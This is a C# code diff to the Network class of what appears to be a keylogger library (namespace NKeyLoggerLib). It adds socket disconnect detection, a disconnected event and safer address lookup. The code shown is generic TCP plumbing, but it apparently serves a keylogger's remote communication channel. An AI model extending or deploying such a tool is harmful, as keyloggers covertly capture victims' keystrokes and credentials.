@@ -7,29 +7,60 @@ using System.Net.Security;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
+using Microsoft.Extensions.Logging;
 
 namespace NKeyLoggerLib;
 
 public class Network : IDisposable
 {
+    private const int CHECK_CONNECTION_ELIPSE = 10000;
     public Socket socket { get; } = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+    private readonly System.Timers.Timer disconnectCheckTimer = new System.Timers.Timer(CHECK_CONNECTION_ELIPSE);
     private const int readBlockSize = 0x100;
 
-    public Network(Socket socket)
+    public Network(Socket socket) : this()
     {
         this.socket = socket;
     }
 
     public Network()
     {
-
+        disconnectCheckTimer.Elapsed += onCheckDisconnect;
+        disconnectCheckTimer.Start();
     }
-
     ~Network()
     {
         Dispose();
     }
 
+    private void onCheckDisconnect(object? sender, System.Timers.ElapsedEventArgs e)
+    {
+        disconnectCheckTimer.Stop();
+        if (!isConnected())
+            disconnected?.Invoke(this);
+        disconnectCheckTimer.Start();
+    }
+
+    public bool isConnected()
+    {
+        if (!socket.Connected)
+            return false;
+
+        try
+        {
+            if (socket.Poll(0, SelectMode.SelectRead))
+            {
+                var buffer = new byte[1];
+                if (socket.Receive(buffer, 0, SocketFlags.Peek) == 0)
+                    return false;
+            }
+            return true;
+        }
+        catch (SocketException)
+        {
+            return false;
+        }
+    }
     private async Task<List<byte>> readAsync(long total)
     {
         if (socket == null)
@@ -73,17 +104,20 @@ public class Network : IDisposable
 
     public string getAddress()
     {
-        return ((IPEndPoint)socket.RemoteEndPoint!).Address.ToString();
-    }
-
-    public IPAddress getIPAddress()
-    {
-        return IPAddress.Parse(((IPEndPoint)socket.RemoteEndPoint!).Address.ToString());
+        try
+        {
+            return ((IPEndPoint)socket.RemoteEndPoint!).Address.ToString();
+        } catch (ObjectDisposedException e)
+        {
+            return "";
+        }
     }
     public void Dispose()
     {
         try
         {
+            disconnectCheckTimer.Stop();
+            disconnectCheckTimer.Close();
             socket.Shutdown(SocketShutdown.Both);
         }
         catch (Exception) { }
@@ -105,4 +139,6 @@ public class Network : IDisposable
         CRYPTOKEY = 2,
     }
 
+    public delegate void DisconnectedDelegate(Network sender);
+    public event DisconnectedDelegate? disconnected;
 }
